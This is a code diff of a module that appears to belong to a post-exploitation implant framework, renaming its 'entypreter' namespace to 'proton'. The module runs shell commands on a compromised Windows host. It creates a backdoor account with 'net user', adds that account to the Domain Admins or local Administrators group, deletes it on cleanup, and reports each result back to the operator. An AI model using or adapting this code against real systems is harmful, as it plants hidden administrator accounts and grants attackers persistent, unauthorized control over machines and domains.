@@ -6,9 +6,9 @@ try
     if (~CLEANUP~)
     {
         var del_user_command = "net user ~USERNAME~ /DEL";
-        var output = entypreter.shell.exec(del_user_command, "~DIRECTORY~\\"+entypreter.uuid()+".txt");
+        var output = proton.shell.exec(del_user_command, "~DIRECTORY~\\"+proton.uuid()+".txt");
         headers["Task"] = "DeleteUser";
-        entypreter.work.report(output, headers);
+        proton.work.report(output, headers);
     }
     else
     {
@@ -17,9 +17,9 @@ try
         {
             add_user_command += " /DOMAIN";
         }
-        var output = entypreter.shell.exec(add_user_command, "~DIRECTORY~\\"+entypreter.uuid()+".txt");
+        var output = proton.shell.exec(add_user_command, "~DIRECTORY~\\"+proton.uuid()+".txt");
         headers["Task"] = "CreateUser";
-        entypreter.work.report(output, headers);
+        proton.work.report(output, headers);
         if (output.indexOf("error") != -1)
         {
             throw "";
@@ -29,23 +29,23 @@ try
         {
             if (~DOMAIN~)
             {
-                output = entypreter.shell.exec("net group \"Domain Admins\" ~USERNAME~ /ADD /DOMAIN", "~DIRECTORY~\\"+entypreter.uuid()+".txt");
+                output = proton.shell.exec("net group \"Domain Admins\" ~USERNAME~ /ADD /DOMAIN", "~DIRECTORY~\\"+proton.uuid()+".txt");
             }
             else
             {
-                output = entypreter.shell.exec("net localgroup Administrators ~USERNAME~ /ADD", "~DIRECTORY~\\"+entypreter.uuid()+".txt");
+                output = proton.shell.exec("net localgroup Administrators ~USERNAME~ /ADD", "~DIRECTORY~\\"+proton.uuid()+".txt");
             }
             headers["Task"] = "MakeAdmin";
-            entypreter.work.report(output, headers);
+            proton.work.report(output, headers);
         }
     }
 
-    entypreter.work.report("Complete");
+    proton.work.report("Complete");
 
 }
 catch (e)
 {
-    entypreter.work.error(e);
+    proton.work.error(e);
 }
 
-entypreter.exit();
+proton.exit();
